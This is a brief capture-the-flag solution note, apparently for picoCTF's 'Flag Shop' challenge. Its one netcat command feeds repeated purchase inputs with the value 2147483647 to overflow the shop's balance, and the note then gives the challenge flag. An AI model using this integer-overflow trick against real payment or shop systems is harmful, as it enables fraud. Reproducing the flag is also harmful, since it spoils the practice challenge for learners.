# [Flag Shop](`https://play.picoctf.org/practice/challenge/49?category=5&page=2`)

## Status: In Progress

```

nc jupiter.challenges.picoctf.org 9745 < <(for i in {1..110} ; do echo -n "2\n1\n2147483647\n" ; done ; echo "2\n2\n1\n3")

```

Answer: `picoCTF{m0n3y_bag5_65d67a74}`.